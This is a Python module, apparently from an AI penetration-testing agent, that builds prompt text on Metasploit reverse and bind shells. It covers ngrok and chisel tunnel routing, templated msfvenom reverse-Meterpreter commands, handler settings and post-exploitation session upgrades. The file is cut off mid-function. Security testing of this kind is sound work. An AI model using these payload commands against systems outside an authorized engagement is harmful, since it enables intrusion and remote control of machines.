"""
RedAmon Agent Utility Functions

Utility functions for API and prompts that are not orchestrator-specific.
Orchestrator-specific helpers are in orchestrator_helpers/.
"""

import asyncio
import contextvars
import logging
import os
import re
import time
from collections import OrderedDict
from dataclasses import dataclass
from textwrap import dedent
from typing import Optional

import httpx

from project_settings import get_setting

logger = logging.getLogger(__name__)

#: The lookups' default: the run's own sandbox as sandbox_router.known_sandbox knows it.
_RUN = object()
#: A sandbox not known yet: no port is shown and no tunnel is read anywhere.
_NO_SANDBOX = object()
#: Replaced by the tests with an httpx.MockTransport; None is httpx's own.
_async_transport = None
_TUNNEL_READ_S = 3.0
_TUNNEL_STATUS_MAX_BYTES = 64 * 1024
#: A prompt is built on the event loop every run shares, and a sandbox's root sets the
#: pace of its answers: building one never dials a sandbox. It reads the tunnel manager's
#: last answer per instance, (person, view, instance) -> (read at, status or None);
#: a missing or stale one is read again in the background, bounded.
_TUNNEL_STATUS_TTL_S = 30.0
#: A tunnel still connecting is read again sooner: its next state decides the mode.
_TUNNEL_STATUS_SETTLING_TTL_S = 3.0
#: A tunnel connecting longer than this did not come up: it counts as off, so a pool port
#: that works is used instead of waiting on it forever. (instance key, tunnel) -> since.
_CONNECTING_LIMIT_S = 45.0
_connecting_since: "OrderedDict[tuple, float]" = OrderedDict()
_TUNNEL_STATUS_MAX = 1024
_tunnel_status: "OrderedDict[tuple, tuple]" = OrderedDict()
_tunnel_refreshes: dict = {}
_TUNNEL_HOST = re.compile(r"[A-Za-z0-9](?:[A-Za-z0-9-]{0,62})(?:\.[A-Za-z0-9](?:[A-Za-z0-9-]{0,62}))*")
#: chisel forwards the handler port only (mcp/servers/tunnel_manager.py, R:4444).
_CHISEL_PORT = 4444


def get_session_count() -> int:
    """Get total number of active sessions."""
    from orchestrator_helpers import get_checkpointer
    cp = get_checkpointer()
    if cp and hasattr(cp, 'storage'):
        return len(cp.storage)
    return 0


def _section(*paragraphs: str) -> list[str]:
    """Convert dedented text blocks into a flat list of lines with blank separators."""
    lines: list[str] = []
    for p in paragraphs:
        lines.extend(dedent(p).strip().splitlines())
        lines.append("")
    return lines


@dataclass(frozen=True)
class PayloadPlan:
    """Which payload direction works now, from the person's Kali sandbox, and with which
    values: what the payload-settings block shows and what the LHOST/LPORT gate checks.

    ``mode``: ``reverse`` (``lhost``/``lport`` set, through ``tunnel`` when one is on),
    ``bind``, ``ask_lhost`` (a pool port, no LHOST), ``ask_bind`` (no way back to the
    sandbox and no bind port) or ``unknown`` (the sandbox, or an enabled tunnel's state, is
    not known yet: nothing is asked).
    ``port_state``: ``assigned``, ``no_pool``, ``pool_full``, ``none`` (no port, reason not
    reported) or ``unknown``. ``ngrok``/``chisel``: ``on``, ``connecting``, ``stuck``
    (connecting too long: counts as off), ``off``, ``error``, ``unanswered``, ``unread``,
    ``act_as``, ``unknown`` or ``disabled``."""
    mode: str
    lhost: Optional[str]
    lport: Optional[int]
    bind_port: Optional[int]
    project_lport: Optional[int]
    tunnel: Optional[str]
    pool_port: Optional[int]
    port_state: str
    unknown: str
    ngrok: str
    chisel: str
    https: bool


def _port_setting(value) -> Optional[int]:
    return value if isinstance(value, int) and not isinstance(value, bool) and value > 0 else None


def _reverse_port_facts(sandbox) -> tuple:
    """(port_state, pool port or None) of the sandbox the prompt describes."""
    import sandbox_contract

    if sandbox is _NO_SANDBOX or not getattr(sandbox, "reverse_port_known", True):
        return "unknown", None
    port = getattr(sandbox, "reverse_port", None)
    state = sandbox_contract.reverse_port_state(getattr(sandbox, "reverse_port_state", None))
    if not isinstance(port, int) or isinstance(port, bool):
        return "unknown", None
    if port != sandbox_contract.DEFAULT_REVERSE_PORT and state in (None, sandbox_contract.REVERSE_PORT_ASSIGNED):
        return sandbox_contract.REVERSE_PORT_ASSIGNED, port
    if state in (sandbox_contract.REVERSE_PORT_NO_POOL, sandbox_contract.REVERSE_PORT_POOL_FULL):
        return state, None
    return "none", None


def _tunnel_state(name: str, sandbox) -> str:
    """Why an enabled tunnel is not on, from what the sandbox's tunnel manager last said."""
    import sandbox_contract

    if sandbox is _NO_SANDBOX:
        return "unknown"
    if sandbox.view != sandbox_contract.VIEW_OWN:
        return "act_as"
    entry = _tunnel_status.get(sandbox.key)
    if entry is None:
        return "unread"
    data = entry[1]
    if not isinstance(data, dict):
        return "unanswered"
    value = data.get(name)
    status = value.get("status") if isinstance(value, dict) else None
    if status == "connecting":
        since = _connecting_since.setdefault((sandbox.key, name), entry[0])
        return "stuck" if time.monotonic() - since > _CONNECTING_LIMIT_S else "connecting"
    if isinstance(status, str) and status.startswith("error"):
        return "error"
    return "off"


def payload_plan() -> PayloadPlan:
    """The plan for this run's person, from the project's settings and what is known of
    their sandbox (sandbox_router.known_sandbox). In order:

    1. a tunnel the sandbox reports on (ngrok, then chisel): REVERSE through it;
    2. the project asks for BIND only (a bind port, no LHOST, no LPORT): BIND;
    3. the sandbox, its port, or an enabled tunnel's state not known yet (or the tunnel
       still connecting): UNKNOWN;
    4. a pool port: it is LPORT (the project's LPORT does not apply): REVERSE with the
       project's LHOST, else ASK for LHOST;
    5. no pool port and no tunnel: nothing reaches the sandbox, so BIND only, or ASK for a
       bind port (or a tunnel)."""
    lhost = get_setting('LHOST', '') or None
    project_lport = _port_setting(get_setting('LPORT'))
    bind_port = _port_setting(get_setting('BIND_PORT_ON_TARGET'))
    https = bool(get_setting('PAYLOAD_USE_HTTPS', False))
    ngrok_enabled = bool(get_setting('NGROK_TUNNEL_ENABLED', False))
    chisel_enabled = bool(get_setting('CHISEL_TUNNEL_ENABLED', False))
    sandbox = _tunnel_sandbox()
    port_state, pool = _reverse_port_facts(sandbox)

    ngrok = _query_ngrok_tunnel() if ngrok_enabled else None
    chisel = _query_chisel_tunnel() if chisel_enabled and not ngrok else None
    ngrok_state = "on" if ngrok else (_tunnel_state("ngrok", sandbox) if ngrok_enabled else "disabled")
    chisel_state = ("on" if chisel else "disabled" if not chisel_enabled or ngrok
                    else _tunnel_state("chisel", sandbox))

    def plan(mode, lport=None, tunnel=None, unknown="", via=None):
        return PayloadPlan(mode=mode, lhost=via or lhost, lport=lport, bind_port=bind_port,
                           project_lport=project_lport, tunnel=tunnel, pool_port=pool,
                           port_state=port_state, unknown=unknown, ngrok=ngrok_state,
                           chisel=chisel_state, https=https)

    for name, info in (("ngrok", ngrok), ("chisel", chisel)):
        if info:
            return plan("reverse", lport=info['port'], tunnel=name, via=info['host'])
    if bind_port and not lhost and not project_lport:
        return plan("bind")
    if port_state == "unknown":
        return plan("unknown", unknown="sandbox")
    if {"unread", "connecting"} & {ngrok_state, chisel_state}:
        return plan("unknown", unknown="connecting" if "connecting" in (ngrok_state, chisel_state)
                    else "tunnel")
    if pool:
        return plan("reverse" if lhost else "ask_lhost", lport=pool)
    return plan("bind" if bind_port else "ask_bind")


_TUNNEL_NAMES = {"ngrok": "ngrok", "chisel": "Chisel"}


def _tunnel_banner(name: str, state: str) -> str:
    """Why an enabled tunnel is not used. Never "check the token" alone: a restart turns
    tunnels off, and an act-as sandbox never has one."""
    title = f"**{_TUNNEL_NAMES[name]} Tunnel"
    setting = "ngrok token" if name == "ngrok" else "chisel server URL"
    if state == "act_as":
        return (f"{title}: not available** — this run acts as another person (an administrator "
                "acting as them) in their act-as sandbox, which never has a tunnel: the person's "
                "own tunnel reaches only their own sandbox. Nothing is wrong with their tunnel "
                "settings.")
    if state == "error":
        return (f"{title}: FAILED** — its process runs in your Kali sandbox but the tunnel is not "
                "up. For chisel this is usually the server refusing remote port 4444, which "
                "another person's tunnel on the same chisel server already holds (each person "
                "needs their own chisel server), or a wrong server URL or credentials. The "
                "person fixes it in Settings → Tunneling; until then do not use the tunnel.")
    if state == "unanswered":
        return (f"{title}: NO ANSWER** — your Kali sandbox's tunnel manager did not answer, so "
                "the tunnel counts as off for now.")
    if state in ("unread", "unknown"):
        return f"{title}: not read yet** — its state shows here from the next step."
    if state == "connecting":
        return (f"{title}: connecting** — it is starting in your Kali sandbox and is not up "
                "yet; its endpoint (or its error) shows here at a later step.")
    if state == "stuck":
        return (f"{title}: did not come up** — it has been connecting in your Kali sandbox "
                f"for over {int(_CONNECTING_LIMIT_S)} s, so it counts as off: do not use it. The "
                f"person checks the {setting} in Settings → Tunneling.")
    return (f"{title}: OFF** — enabled for this project but not on in your Kali sandbox. The "
            "person's tunnel switch is off (Settings → Tunneling; a sandbox restart also "
            f"turns it off), or their {setting} is not set. Ask the user to turn it on if a "
            "reverse payload must go through it.")


def _no_port_reason(port_state: str) -> str:
    if port_state == "pool_full":
        return ("your Kali sandbox has no reverse-shell port because the port pool is full "
                "(every pool port is in use by another sandbox)")
    if port_state == "no_pool":
        return ("your Kali sandbox publishes no reverse-shell port (no port pool is "
                "configured on this RedAmon)")
    return "your Kali sandbox has no reverse-shell port"


#: A sandbox has one port a target can reach (LPORT). A stager that makes the target
#: download the payload from a server of yours needs a second one: every CmdStager flavor
#: of Metasploit 6.5 that fetches (the rest write the payload through the exploit).
_DOWNLOAD_FLAVORS = ("`wget`, `curl`, `tftp`, `ftp_http`, `certutil`, `lwprequest`, "
                     "`psh_invokewebrequest` and `fetch`")
_WRITING_FLAVORS = "`set CMDSTAGER::FLAVOR printf`, `echo` or `bourne` on Linux, `vbs` on Windows"

_ONE_PORT_TARGET = f"""\
    **TARGET: pick one that lands the payload with no download from you** (`show targets`,
    then `set TARGET <n>`). You have exactly ONE port a target can reach: LPORT. Anything
    that makes the target download from you needs a second one and fails: the CmdStager
    {_DOWNLOAD_FLAVORS} flavors, the `cmd/*/http*/*` fetch payloads (FETCH_SRVPORT), and any
    module option SRVHOST/SRVPORT. Never set SRVHOST/SRVPORT. Two kinds of target work:
    - a Dropper/Staged target ('Automatic (Dropper)', 'Linux Dropper') whose CmdStager
      writes the payload through the exploit itself: {_WRITING_FLAVORS};
    - a Command target ('Unix Command', 'Windows Command') with a stageless payload."""

#: Bind mode: nothing of the sandbox serves the target at all.
_NO_DOWNLOAD_BIND = f"""\
    **No download from you:** in bind mode nothing of yours serves the target, so a target
    or CmdStager flavor that makes it download the payload ({_DOWNLOAD_FLAVORS}, the
    `cmd/*/http*/*` fetch payloads, any SRVHOST/SRVPORT) fails. Use a Dropper/Staged target
    with {_WRITING_FLAVORS}, or a Command target with a stageless bind payload."""

_SHARED_PORT = """\
    **One reverse port for all of this person's chats:** the port and its handler are shared
    by every chat and project of this person in this Kali sandbox, and only one handler can
    listen on it. Before starting a handler run `jobs` in `metasploit_console`: if a handler
    for the payload you need already listens there, reuse it (do not start a second one);
    if a handler for another payload holds it, it may be another chat's: stop it with
    `jobs -k <id>` only if you started it, otherwise tell the user the port is busy."""

_SESSION_CHECK = ("After the exploit runs, check for the session with `metasploit_console` "
                  "`sessions -l`.")


def _post_exploitation_section(lhost, lport, tunnel) -> str:
    """`sessions -u` and local exploits start a handler of their own on LPORT (FU-12)."""
    bind = (" plus `set ReverseListenerBindAddress 127.0.0.1` and "
            "`set ReverseListenerBindPort 4444`" if tunnel else "")
    bind_g = (", `setg ReverseListenerBindAddress 127.0.0.1` and "
              "`setg ReverseListenerBindPort 4444`" if tunnel else
              " (after `unsetg ReverseListenerBindAddress ReverseListenerBindPort`, which a "
              "tunnel may have left set)")
    return dedent(f"""\
        **Session upgrade and local exploits (post-exploitation):** `sessions -u <id>`,
        `post/multi/manage/shell_to_meterpreter` and a local privilege-escalation exploit each
        start a NEW handler on LPORT, while the exploit's handler may still hold it. First run
        `jobs` and stop the handler you started on that port (`jobs -k <id>`; your open
        sessions survive it). Then use these values: in the module `set LHOST {lhost}` and
        `set LPORT {lport}`{bind}; for `sessions -u`, which reads the global values, run
        `setg LHOST {lhost}`, `setg LPORT {lport}`{bind_g} first (its own default port,
        4433, reaches no one).""")


def get_session_config_prompt() -> str:
    """
    The "Pre-Configured Payload Settings" block: the payload direction that works now from
    the person's Kali sandbox, with the exact LHOST/LPORT (payload_plan).

    With no active tunnel and a pool port, LPORT is the pool port everywhere this block
    shows it; with no tunnel and no pool port only BIND is offered (or a tunnel); before
    the sandbox is known the block says so and asks nothing.
    """
    p = payload_plan()
    lines: list[str] = ["### Pre-Configured Payload Settings", ""]

    # -------------------------------------------------------------------------
    # TUNNEL BANNERS
    # -------------------------------------------------------------------------
    if p.tunnel == "ngrok":
        lines += _section(f"""\
            **ngrok Tunnel: ACTIVE** — public endpoint `{p.lhost}:{p.lport}`
            The Metasploit listener runs inside your Kali sandbox on port 4444.
            The target connects to the ngrok public URL, which tunnels traffic to your listener.

            **CRITICAL: You MUST use REVERSE payloads (reverse_tcp or reverse_https).
            NEVER use bind payloads — bind mode cannot work through an ngrok tunnel
            because ngrok only forwards inbound connections to the local listener.**""")
    elif p.ngrok not in ("disabled", "on") and p.mode != "unknown":
        lines += _section(_tunnel_banner("ngrok", p.ngrok))

    if p.tunnel == "chisel":
        lines += _section(f"""\
            **Chisel Tunnel: ACTIVE** — handler `{p.lhost}:{p.lport}`
            The Metasploit listener runs inside your Kali sandbox on port 4444.
            The target connects to the VPS public IP, which tunnels traffic through chisel.
            Only that one port is tunnelled: nothing else in your sandbox (no web
            delivery or HTA server) is reachable from the target.

            **CRITICAL: You MUST use REVERSE payloads (reverse_tcp or reverse_https).
            NEVER use bind payloads — bind mode cannot work through a chisel tunnel
            because chisel only forwards inbound connections to the local listener.**""")
    elif p.chisel not in ("disabled", "on") and p.mode != "unknown":
        lines += _section(_tunnel_banner("chisel", p.chisel))

    # -------------------------------------------------------------------------
    # THE MODE
    # -------------------------------------------------------------------------
    if p.mode == "reverse":
        lines += _reverse_mode(p)
    elif p.mode == "bind":
        lines += _bind_mode(p)
    elif p.mode == "unknown":
        lines += _unknown_mode(p)
    else:
        lines += _ask_mode(p)

    lines += _section("Replace `<os>/<arch>` with target OS (e.g., `linux/x64`, `windows/x64`).")

    return "\n".join(lines)


def get_reachable_port_note() -> str:
    """One line for a run that does not show the full payload-settings block (stateless
    mode, or before exploitation) but whose skill names it: an out-of-band XXE DTD, an RFI
    payload or a takeover PoC served for the target to fetch needs the one port of the
    person's sandbox a target can reach, and the address it reaches it at."""
    p = payload_plan()
    head = "### Pre-Configured Payload Settings (summary)\n"
    if p.mode == "reverse" and p.tunnel:
        name = _TUNNEL_NAMES.get(p.tunnel, p.tunnel)
        return head + (f"Your one target-reachable inbound port: serve or listen on `4444` inside your "
                       f"Kali sandbox; the target reaches it at `{p.lhost}:{p.lport}` through your "
                       f"{name} tunnel. Nothing else in the sandbox is reachable from the target.")
    if p.mode == "reverse":
        return head + (f"Your one target-reachable inbound port: serve or listen on `{p.lport}` inside "
                       f"your Kali sandbox; the target reaches it at `{p.lhost}:{p.lport}`. Nothing "
                       f"else in the sandbox is reachable from the target.")
    if p.mode == "ask_lhost":
        return head + (f"Your Kali sandbox's target-reachable port is `{p.lport}`, but no LHOST is set: "
                       f"the address a target reaches the RedAmon host at is not known. Ask the person "
                       f"for it, or use OAST (interactsh) instead of serving a file.")
    if p.mode == "unknown":
        return head + ("Your sandbox's reverse port is not known yet: run `echo $MSF_REVERSE_PORT` in "
                       "kali_shell (`4444` means it has none) before serving anything a target must "
                       "fetch.")
    return head + ("No port of your Kali sandbox is reachable from the target (no reverse port and no "
                   "tunnel): never serve a file for the target to fetch; use OAST (interactsh) or a "
                   "hosted endpoint that returns a body.")


def _reverse_mode(p: PayloadPlan) -> list:
    LHOST, LPORT = p.lhost, p.lport
    if p.https:
        conn_type = "reverse_https"
        reason = "PAYLOAD_USE_HTTPS=True (encrypted, evades firewalls)"
    else:
        conn_type = "reverse_tcp"
        reason = "PAYLOAD_USE_HTTPS=False (fastest, plain TCP)"

    lines = _section(f"""\
        **Mode: REVERSE** (target connects to you)

        ```
        ┌─────────────┐                    ┌─────────────┐
        │   TARGET    │ ───connects to───► │  ATTACKER   │
        │             │                    │ {LHOST}:{LPORT} │
        └─────────────┘                    └─────────────┘
        ```

        **Payload type:** `{conn_type}` ({reason})""", _ONE_PORT_TARGET, f"""\
        **Then select a Meterpreter reverse payload from `show payloads`:**

        Look for payloads with `meterpreter/{conn_type}` in the name.
        Choose the appropriate payload based on target platform:
        - `cmd/unix/*/meterpreter/{conn_type}` for interpreted languages (PHP, Python, etc.)
        - `linux/*/meterpreter/{conn_type}` for Linux native binaries
        - `windows/*/meterpreter/{conn_type}` for Windows targets""")

    if p.tunnel == "ngrok":
        lines += _section(f"""\
            **IMPORTANT: ngrok tunnel is active — REVERSE payloads ONLY!**

            **⚠️ STAGELESS PAYLOADS REQUIRED WITH NGROK!**
            Staged payloads (`meterpreter/reverse_tcp` with `/`) FAIL through ngrok —
            the stage transfer gets corrupted by the tunnel proxy and the session dies instantly.
            You MUST use **stageless** payloads (`meterpreter_reverse_tcp` with `_` underscore):

            | BROKEN (staged `/`) | USE THIS (stageless `_`) |
            |---------------------|--------------------------|
            | `linux/x64/meterpreter/{conn_type}` | `linux/x64/meterpreter_{conn_type}` |
            | `windows/meterpreter/{conn_type}` | `windows/meterpreter_{conn_type}` |
            | `cmd/unix/python/meterpreter/{conn_type}` | `python/meterpreter_{conn_type}` |

            There are TWO different LHOST/LPORT values — do NOT confuse them:

            | Purpose | LHOST | LPORT |
            |---------|-------|-------|
            | **Metasploit handler** (inside msfconsole) | `{LHOST}` | `{LPORT}` |
            | **ReverseListenerBind** (where handler actually listens) | `127.0.0.1` | `4444` |
            | **Payload / shell one-liner** (what the target connects to) | `{LHOST}` | `{LPORT}` |

            ngrok forwards `{LHOST}:{LPORT}` → `127.0.0.1:4444` inside your Kali sandbox.

            **Metasploit handler commands (inside msfconsole):**
            ```
            set PAYLOAD <chosen_STAGELESS_reverse_payload>
            set LHOST {LHOST}
            set LPORT {LPORT}
            set ReverseListenerBindAddress 127.0.0.1
            set ReverseListenerBindPort 4444
            set AutoVerifySession false
            set DisablePayloadHandler false
            ```

            **For msfvenom standalone payloads:**
            `msfvenom -p linux/x64/meterpreter_{conn_type} LHOST={LHOST} LPORT={LPORT} -f elf -o /tmp/shell.elf`

            **For shell one-liners (NO-MODULE FALLBACK only):**
            Use `LHOST={LHOST}` and `LPORT={LPORT}` (the ngrok public endpoint).
            The handler MUST use the same LHOST/LPORT + ReverseListenerBindAddress settings above.""")

    elif p.tunnel == "chisel":
        lines += _section(f"""\
            **IMPORTANT: chisel tunnel is active — REVERSE payloads ONLY!**

            **⚠️ STAGELESS PAYLOADS REQUIRED WITH CHISEL!**
            Staged payloads (`meterpreter/reverse_tcp` with `/`) FAIL through chisel —
            the stage transfer gets corrupted by the tunnel and the session dies instantly in a loop.
            You MUST use **stageless** payloads (`meterpreter_reverse_tcp` with `_` underscore):

            | BROKEN (staged `/`) | USE THIS (stageless `_`) |
            |---------------------|--------------------------|
            | `linux/x64/meterpreter/{conn_type}` | `linux/x64/meterpreter_{conn_type}` |
            | `windows/meterpreter/{conn_type}` | `windows/meterpreter_{conn_type}` |
            | `python/meterpreter/{conn_type}` | `python/meterpreter_{conn_type}` |

            There are TWO different LHOST/LPORT contexts — do NOT confuse them:

            | Purpose | LHOST | LPORT |
            |---------|-------|-------|
            | **Metasploit handler** (inside msfconsole) | `{LHOST}` | `{LPORT}` |
            | **ReverseListenerBind** (where handler actually listens) | `127.0.0.1` | `4444` |
            | **Payload / shell one-liner** (what the target connects to) | `{LHOST}` | `{LPORT}` |

            chisel forwards only `{LHOST}:{LPORT}` -> `127.0.0.1:4444` inside your Kali sandbox.

            **Metasploit handler commands (inside msfconsole):**
            ```
            set PAYLOAD <chosen_STAGELESS_reverse_payload>
            set LHOST {LHOST}
            set LPORT {LPORT}
            set ReverseListenerBindAddress 127.0.0.1
            set ReverseListenerBindPort 4444
            set AutoVerifySession false
            set DisablePayloadHandler false
            ```

            **No web delivery or HTA server through chisel:** no server port of yours is
            tunnelled, so a target cannot download a payload from your sandbox.
            Pick a method that needs no download from you (Method A, a self-contained
            Method B document (B1 or B3; never B4, `office_word_hta`, which needs SRVPORT),
            a stageless payload, or a command one-liner), or ask the user.

            **For msfvenom standalone payloads (STAGELESS only):**
            `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o /tmp/shell.elf`

            **For shell one-liners (NO-MODULE FALLBACK only):**
            Use `LHOST={LHOST}` and `LPORT={LPORT}` (the VPS public endpoint).
            The handler MUST use the same LHOST/LPORT + ReverseListenerBindAddress settings above.""")

    else:
        lines += _section(f"""\
            **Metasploit commands:**
            ```
            unsetg ReverseListenerBindAddress ReverseListenerBindPort
            set PAYLOAD <chosen_payload_from_show_payloads>
            set LHOST {LHOST}
            set LPORT {LPORT}
            ```
            (`unsetg` clears what an earlier tunnel left in this console; otherwise the
            handler would still listen on 127.0.0.1:4444, where nothing arrives.)

            **For msfvenom standalone payloads:**
            `msfvenom -p linux/x64/meterpreter_{conn_type} LHOST={LHOST} LPORT={LPORT} -f elf -o /tmp/shell.elf`

            **For shell one-liners (NO-MODULE FALLBACK only):**
            Use `LHOST={LHOST}` and `LPORT={LPORT}`.""", _pool_note(p))

    lines += _section(_SHARED_PORT, _post_exploitation_section(LHOST, LPORT, p.tunnel), _SESSION_CHECK)
    return lines


def _pool_note(p: PayloadPlan) -> str:
    """LPORT is the sandbox's pool port, never the project's (D-F)."""
    pool = p.lport
    project = (f" The project's LPORT setting (`{p.project_lport}`) does not apply: only "
               f"`{pool}` reaches your sandbox." if p.project_lport and p.project_lport != pool else "")
    return dedent(f"""\
        **Your reverse-shell port is `{pool}`:** your Kali sandbox's own port, published on the
        host at the same number. The handler listens on `{pool}` inside the sandbox and the
        target connects to `{p.lhost}:{pool}`, so LPORT and the handler's port are both
        `{pool}` (no ReverseListenerBindPort).{project} The port answers a target only once
        the operator has opened it (on a local install a `KALI_SANDBOX_PORT_POOL` bind address
        the target reaches; on a deployed server `deploy.sh revshell-open`).""")


def _bind_mode(p: PayloadPlan) -> list:
    BIND_PORT_ON_TARGET = p.bind_port
    lines = []
    if p.port_state not in ("assigned", "unknown"):
        lines += _section(f"""\
            **⚠️ NO DIRECT REVERSE SHELL:** {_no_port_reason(p.port_state)}, and no tunnel
            is on, so no target can connect back to you. Use only the BIND payload below:
            never a reverse payload (reverse_tcp, reverse_https, a reverse one-liner) and
            never a handler waiting for one. For a reverse shell the person must turn on a
            tunnel (Settings → Tunneling: ngrok or chisel).""")
    lines += _section(f"""\
        **Mode: BIND** (you connect to target)

        ```
        ┌─────────────┐                    ┌─────────────┐
        │  ATTACKER   │ ───connects to───► │   TARGET    │
        │    (you)    │                    │ opens :{BIND_PORT_ON_TARGET} │
        └─────────────┘                    └─────────────┘
        ```

        **Then select a Meterpreter bind payload from `show payloads`:**

        Look for payloads with `meterpreter/bind_tcp` in the name.
        Choose the appropriate payload based on target platform:
        - `cmd/unix/*/meterpreter/bind_tcp` for interpreted languages (PHP, Python, etc.)
        - `linux/*/meterpreter/bind_tcp` for Linux native binaries
        - `windows/*/meterpreter/bind_tcp` for Windows targets

        **Metasploit commands:**
        ```
        set PAYLOAD <chosen_payload_from_show_payloads>
        set LPORT {BIND_PORT_ON_TARGET}
        ```

        **Note:** NO LHOST needed for bind payloads!""", _NO_DOWNLOAD_BIND, _SESSION_CHECK)
    return lines


def _unknown_mode(p: PayloadPlan) -> list:
    if p.unknown == "connecting":
        what = ("**Your tunnel: connecting.** A tunnel is enabled for this project and is "
                "still starting in your Kali sandbox, so the LHOST/LPORT to use are not known "
                "yet. They show here once it is up (or its error, if it fails).")
    elif p.unknown == "tunnel":
        what = ("**Your tunnel: not read yet.** A tunnel is enabled for this project and its "
                "state in your Kali sandbox has not been read yet, so the LHOST/LPORT to use "
                "are not known yet. They show here from the next step.")
    else:
        what = ("**Your Kali sandbox: not known yet.** The agent has no current record of "
                "your sandbox (no Kali call has reached it in this run yet, or the one it knew "
                "stopped), so its reverse-shell port (and any tunnel) is not known yet. It "
                "shows here from the step after your next Kali tool call.")
    return _section(what, f"""\
        Until then: do NOT set LHOST/LPORT, start a handler or send a payload, and do NOT ask
        the user for LHOST or LPORT. First run a preparatory Kali step (for example `search`
        or `info` for the module in `metasploit_console`), then use the values this block
        shows. Project settings, for reference: LHOST `{p.lhost or 'empty'}`, bind port on
        target `{p.bind_port or 'empty'}`.""")


def _ask_mode(p: PayloadPlan) -> list:
    whose = " (your sandbox's reverse-shell port)" if p.lport else ""
    lines = _section(f"""\
        ⚠️ **PAYLOAD DIRECTION NOT CONFIGURED - ASK USER BEFORE EXPLOITING!**

        **Current settings:**
        - LHOST (Attacker IP): `{p.lhost or 'empty'}`
        - LPORT (Attacker Port): `{p.lport or 'none'}`{whose}
        - Bind Port on Target: `{p.bind_port or 'empty'}`""")

    if p.mode == "ask_lhost":
        lines += _section(f"""\
            **Problem:** LHOST is missing. LPORT is already known: your sandbox's
            reverse-shell port `{p.lport}`.

            **Use `action: "ask_user"` to ask which payload mode to use:**

            1. **REVERSE** (target connects back to you):
               - Requires: LHOST (the address of this RedAmon host the target reaches); LPORT is `{p.lport}`

            2. **BIND** (you connect to target):
               - Requires: Bind port on target (e.g. 4444)""")
        lines += _section(_lhost_hint(p.lport, os.getenv("HOST_LAN_IP", "").strip()))
        return lines

    lines += _section(f"""\
        **⚠️ NO DIRECT REVERSE SHELL:** {_no_port_reason(p.port_state)}, and no tunnel is
        on, so no target can connect back to you: never use a reverse payload (reverse_tcp,
        reverse_https, a reverse one-liner) or a handler waiting for one, and do not suggest
        the host's LAN IP as LHOST.

        **Use `action: "ask_user"` to ask the user for ONE of:**

        1. **BIND** (you connect to target):
           - Requires: Bind port on target (e.g. 4444)

        2. **A tunnel**, for a reverse payload: the person turns on ngrok or chisel in
           Settings → Tunneling (and the project's tunnel option); this block then shows its
           endpoint.""")
    return lines


def _lhost_hint(pool: int, host_lan_ip: str) -> str:
    """Which address is LHOST for a pool port: the host's, never the sandbox's."""
    if host_lan_ip:
        suggest = (f"RedAmon's address for this host is `{host_lan_ip}` (the public IP a "
                   "deployed server was given, else the LAN IP of the default route, which a "
                   "target behind NAT may not reach): suggest it as LHOST and confirm with the user.")
    else:
        suggest = "ASK THE USER for it, do not run a command to find it."
    return dedent(f"""\
        **⚠️ WHICH IP IS LHOST — DO NOT GUESS OR AUTO-DETECT IT.**
        Your tools run inside your own Kali sandbox, whose address is a private
        Docker IP the target CANNOT reach: reading it (`ip addr` / `ifconfig` /
        `hostname -I`) gives the WRONG LHOST. Its reverse-shell port `{pool}` is
        published on the host: use LPORT `{pool}` (the handler listens on `{pool}`
        inside the sandbox), and as LHOST the host's address the target can reach.
        The port answers the target only once the operator has opened it: on a local
        install by giving `KALI_SANDBOX_PORT_POOL` a bind address the target reaches;
        on a deployed server, where the pool stays on loopback, by running
        `deploy.sh revshell-open`, which forwards it from the server's public IP to
        the engagement's target ranges only. If the user cannot confirm it is open,
        say so before exploiting. {suggest}""")


def _tunnel_sandbox(handle=_RUN):
    """Whose sandbox the lookups read: the handle, else the run's own as
    sandbox_router.known_sandbox knows it (its handle, or the person's last known instance
    for this view), else _NO_SANDBOX, which reads nothing: never another person's."""
    import sandbox_router

    if handle is _RUN:
        handle = sandbox_router.known_sandbox()
    return _NO_SANDBOX if handle is None else handle


def tunnels_from_status(data) -> tuple:
    """(ngrok, chisel) from a sandbox tunnel manager's `/tunnel/status`: each the public
    endpoint of an active tunnel, or None. The sandbox's root writes this answer, so a
    host or port outside its shape reads as no tunnel. A `status` other than "on" (chisel's
    "error: ..." when its server refuses the remote port) is not active, whatever
    `active` says; a manager too old to send `status` is judged by `active` alone."""
    def entry(name):
        value = data.get(name) if isinstance(data, dict) else None
        if not isinstance(value, dict) or value.get("active") is not True:
            return None
        if "status" in value and value.get("status") != "on":
            return None
        host = value.get("host")
        if not isinstance(host, str) or len(host) > 253 or not _TUNNEL_HOST.fullmatch(host):
            return None
        return value

    ngrok, chisel = entry("ngrok"), entry("chisel")
    ngrok_port = ngrok.get("port") if ngrok else None
    if not (isinstance(ngrok_port, int) and not isinstance(ngrok_port, bool) and 1 <= ngrok_port <= 65535):
        ngrok = None
    return (
        {"host": ngrok["host"], "port": ngrok_port, "hostname": ngrok["host"]} if ngrok else None,
        {"host": chisel["host"], "port": _CHISEL_PORT, "hostname": chisel["host"]} if chisel else None,
    )


def _tunnel_status_request(handle) -> tuple:
    """(url, headers) of an instance's tunnel status: its tunnel manager on 8015, with its
    tunnel token, else its MCP token (which the tunnel manager takes for this read)."""
    import sandbox_router

    headers = sandbox_router.headers_for(handle, "tunnel") or sandbox_router.headers_for(handle)
    return sandbox_router.url_for(handle, "tunnel", "/tunnel/status"), headers


async def _read_tunnel_status(key: tuple, url: str, headers: dict) -> dict | None:
    from sandbox_http import read_answer

    try:
        async with httpx.AsyncClient(timeout=_TUNNEL_READ_S, transport=_async_transport) as client:
            answer = await read_answer(client, "GET", url, headers=headers,
                                       max_bytes=_TUNNEL_STATUS_MAX_BYTES, deadline_s=_TUNNEL_READ_S)
        data = answer.json() if answer.status == 200 else None
    except Exception as e:  # noqa: BLE001 - no tunnel is the normal state
        logger.debug(f"sandbox tunnel status not read: {type(e).__name__}")
        data = None
    _tunnel_status[key] = (time.monotonic(), data if isinstance(data, dict) else None)
    _tunnel_status.move_to_end(key)
    _note_connecting(key, data)
    while len(_tunnel_status) > _TUNNEL_STATUS_MAX:
        _tunnel_status.popitem(last=False)
    return _tunnel_status[key][1]


async def refresh_tunnel_status(handle) -> dict | None:
    """Read an instance's tunnel status now (bounded, through sandbox_http.read_answer),
    remember it for the prompts, and return it; None when it did not answer."""
    url, headers = _tunnel_status_request(handle)
    return await _read_tunnel_status(handle.key, url, headers)


def forget_tunnel_status(keys) -> None:
    """A push changed these instances' tunnels: the next prompt reads them again, and a
    tunnel connecting again starts its time anew."""
    for key in keys:
